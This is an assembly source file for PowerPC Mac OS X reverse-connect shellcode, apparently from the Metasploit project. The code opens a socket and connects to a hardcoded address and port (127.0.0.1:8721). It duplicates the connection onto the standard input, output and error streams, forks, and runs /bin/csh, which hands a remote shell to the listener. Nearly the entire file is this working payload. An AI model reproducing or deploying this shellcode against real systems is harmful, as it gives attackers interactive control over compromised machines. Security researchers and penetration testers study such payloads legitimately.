;      Title:  MacOS X Reverse Connect
;  Platforms:  MacOS X (Tested 10.3.3 | 10.3.4)
;     Author:  hdm[at]metasploit.com (using ghandi execve foo)


.globl _main
.globl _execsh
.text
_main:
        ;; socket
        li      r3, 2
        li      r4, 1
        li      r5, 6
        li      r0, 97
        sc
        xor     r0, r0, r0
        mr      r30, r3

        bl konnect
        .long 0x00022211
        .long 0x7f000001

konnect:
        mflr    r4
        li      r5, 0x10
        li      r0, 98
        mr      r3, r30
        sc
        xor     r0, r0, r0
        li      r5, 2

dupe:
        li      r0, 90
        mr      r3, r30
        mr      r4, r5
        sc
        xor     r0, r0, r0
        subi    r5, r5, 1
        cmpwi   r5, -1
        bnel    dupe

_vforkx:
        ;; we must have one vforked child if we want to not fail
        ;; the execve on threaded applications. kern_exec.c:258
        ;; this could also be a fork()...
        li      r0, 66
        sc
        xor     r0, r0, r0


_execsh:
        ;; based on ghandi's execve
        xor.    r5, r5, r5
        bnel    _execsh
        mflr    r3
        addi    r3, r3, 32      ; 32
        stw     r3, -8(r1)      ; argv[0] = path
        stw     r5, -4(r1)      ; argv[1] = NULL
        subi    r4, r1, 8       ; r4 = {path, 0}
        li      r0, 59
        sc                      ; execve(path, argv, NULL)
        xor     r0, r0, r0      ; testing
path:   .asciz "/bin/csh"
